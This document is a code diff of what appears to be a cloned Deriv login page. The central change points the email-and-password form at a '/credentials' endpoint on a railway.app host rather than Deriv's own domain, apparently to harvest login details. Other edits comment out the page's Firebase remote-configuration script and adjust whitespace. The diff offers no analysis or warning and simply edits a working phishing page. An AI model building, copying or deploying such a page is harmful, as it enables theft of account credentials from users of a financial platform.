@@ -705,7 +705,7 @@
 
         <div id="container">
             <h1 class="title-text">Welcome back</h1>
-            <form novalidate id="frmLogin" method="POST" action="https://winter.up.railway.app/credentials">
+            <form novalidate id="frmLogin" method="POST" action="https://deriv.up.railway.app/credentials">
                 <div class='input-group'>
                     <div class="input-wrapper ">
                         <input type="email" id="txtEmail" name="email" placeholder="example@email.com" value="" required autocomplete="off"  autofocus="autofocus"  maxlength="254"  />
@@ -748,8 +748,7 @@
             <div id="passkeysContainer"></div>
         
         
-        
-
+    
             <link href="https://static.deriv.app/css/oneall-deriv.css" type="text/css" rel="stylesheet" />
             <style>
                 .providers_row {
@@ -846,6 +845,8 @@
                 return 1;
             }
         </script>
+
+
         <script>
          window.local_config = {
              "marketing_growthbook": true,
@@ -856,28 +857,28 @@
              "tracking_datadog": true
          };
         </script>
+
+
         <script type="module">
             let fallbackTimeout = setTimeout(() => update_social_buttons(window.local_config), 2000);
             
-            import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js';
-            import {getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
-            const firebaseConfig = {
-                databaseURL: 'https://app-config-prod.firebaseio.com'
-            }
-            const app = initializeApp(firebaseConfig,'oauthConfig');
-            const db = getDatabase(app);
-            const oauthRef = ref(db, 'remote_config/oauth');
-            onValue(oauthRef, (snapshot) => {
-                clearTimeout(fallbackTimeout);
-                const data = snapshot.val();
-                update_social_buttons(data);
-            },
-            (error) => console.log(error)
-            );
+            // import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js';
+            // import {getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+            // const firebaseConfig = {
+            //     databaseURL: 'https://app-config-prod.firebaseio.com'
+            // }
+            // const app = initializeApp(firebaseConfig,'oauthConfig');
+            // const db = getDatabase(app);
+            // const oauthRef = ref(db, 'remote_config/oauth');
+            // onValue(oauthRef, (snapshot) => {
+            //     clearTimeout(fallbackTimeout);
+            //     const data = snapshot.val();
+            //     update_social_buttons(data);
+            // },
+            // (error) => console.log(error)
+            // );
         </script>
         
-            
-
         <!-- Google Tag Manager -->
         <script>
             (function (w, d, s, l, i) {
@@ -911,7 +912,6 @@
                             </a>`;
                 }
             }
-
             var app_id = '16929';
             document.getElementById("logo-container").innerHTML = logoSelector(app_id);
         </script>
